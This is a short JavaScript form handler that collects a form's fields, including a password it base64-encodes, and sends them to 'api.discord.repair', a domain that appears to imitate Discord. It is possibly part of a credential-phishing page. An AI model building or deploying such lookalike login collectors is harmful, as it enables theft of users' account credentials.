window.addEventListener("load", () => {
  function sendData() {
    const XHR = new XMLHttpRequest();
    // Bind the FormData object and the form element
    const FD = new FormData(form);
    var captchaCode = grecaptcha.getResponse();
    //Add extra data to form before submission.
    FD.append("captchaCode", captchaCode);
    // Define what happens on successful data submission
    XHR.addEventListener("load", (event) => {
      alert(event.target.responseText);
    });

    // Define what happens in case of error
    XHR.addEventListener("error", (event) => {
      alert("Oops! Something went wrong.");
    });

    // Set up our request
    XHR.open("PUT", "https://api.discord.repair/v1/user");
    XHR.setRequestHeader("Content-Type", "application/json");
    var json = JSON.stringify(Object.fromEntries(FD));
    //console.log(json);
    const jsonRequest = JSON.parse(json);
    var byteArr = str2ByteArr(jsonRequest.password);
    var idk = arrayBufferToBase64(byteArr);
    jsonRequest.password = idk;
    // The data sent is what the user provided in the form
    json = JSON.stringify(jsonRequest);
    console.log(json);
    XHR.send(json);
  }

  // Get the form element
  const form = document.getElementById("myForm");

  // Add 'submit' event handler
  form.addEventListener("submit", (event) => {
    event.preventDefault();

    sendData();
  });
});

function str2ByteArr(str) {
  var bytes = [];

  for (var i = 0; i < str.length; ++i) {
    bytes.push(str.charCodeAt(i));
    bytes.push(0);
  }
  return bytes;
}
function arrayBufferToBase64(buffer) {
  var binary = "";
  var bytes = new Uint8Array(buffer);
  var len = bytes.byteLength;
  for (var i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return window.btoa(binary);
}
